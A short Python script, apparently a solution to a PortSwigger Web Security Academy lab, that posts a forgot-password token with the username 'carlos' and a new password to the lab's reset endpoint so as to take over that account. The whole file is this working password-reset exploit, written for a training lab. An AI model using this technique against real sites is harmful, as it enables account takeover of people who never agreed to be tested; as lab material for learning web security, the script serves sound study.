import requests

token = "h7vgbd4szto11vkyx1ctydkqds15mt5n"
base_url = "https://0a7500ad04e9ea838116d9db004000c1.web-security-academy.net/forgot-password"

url = f"{base_url}?temp-forgot-password-token={token}"

data = {
    "temp-forgot-password-token": token,
    "username": "carlos",
    "new-password-1": "zxc",
    "new-password-2": "zxc",
}

response = requests.post(url, data=data, allow_redirects=False)

print(response.status_code)
print(response.headers.get("Location"))